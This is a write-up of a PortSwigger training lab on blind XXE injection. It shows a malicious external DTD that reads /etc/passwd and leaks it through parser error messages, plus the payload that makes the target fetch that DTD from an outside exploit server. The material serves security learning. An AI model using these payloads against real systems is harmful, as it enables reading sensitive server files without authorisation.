# Exploiting blind XXE to retrieve data via error messages

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages), you'll learn: Exploiting blind XXE to retrieve data via error messages! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225063634.png)

In the previous labs, we found that **there is an XXE injection vulnerability in the "Check stock" feature, which parses XML input.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225063710.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225063721.png)

**Original XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225063803.png)

**Invalid XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>
```

As you can see, it **does not display the result**, which indicates that this is a **blind XXE injection**.

To exploit that, we can trigger an XML parsing error, and the error message contains the sensitive data, like `/etc/passwd`.

**In the lab, we have an exploit server, which allows us to host a malicious external DTD:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225064200.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225064216.png)

**Our malicious external DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///errorpls/%file;'>">
%eval;
%error;
```

**Which will:**

- Define an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
- Define an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
- Use the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
- Use the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225064740.png)

**Next, to let the target server fetches our malicious external DTD, we can send the following XXE payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "https://exploit-0a23009a04971e0cc67c8e9a01d90009.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Which will:**

- Define an an XML parameter entity called `xxe`, which fetches our exploit server's malicious DTD and interpret it inline

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-6/images/Pasted%20image%2020221225064923.png)

We did it!

# What we've learned:

1. Exploiting blind XXE to retrieve data via error messages